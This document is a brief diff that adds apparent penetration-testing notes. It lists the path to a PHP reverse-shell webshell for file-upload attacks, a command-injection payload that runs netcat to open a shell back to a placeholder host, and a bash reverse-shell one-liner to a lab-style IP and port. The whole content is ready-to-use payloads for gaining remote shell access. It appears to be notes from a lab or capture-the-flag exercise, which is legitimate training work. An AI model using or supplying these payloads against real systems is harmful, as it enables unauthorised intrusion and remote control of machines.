@@ -1,0 +1,8 @@
+PHP File Upload
+/usr/share/webshells/php/php-reverse-shell.php
+
+Command Injection
+&nc IPADDR PORT -e /bin/sh
+
+Automated bash script
+bash -i >& /dev/tcp/10.10.37.103/4444 0>&1
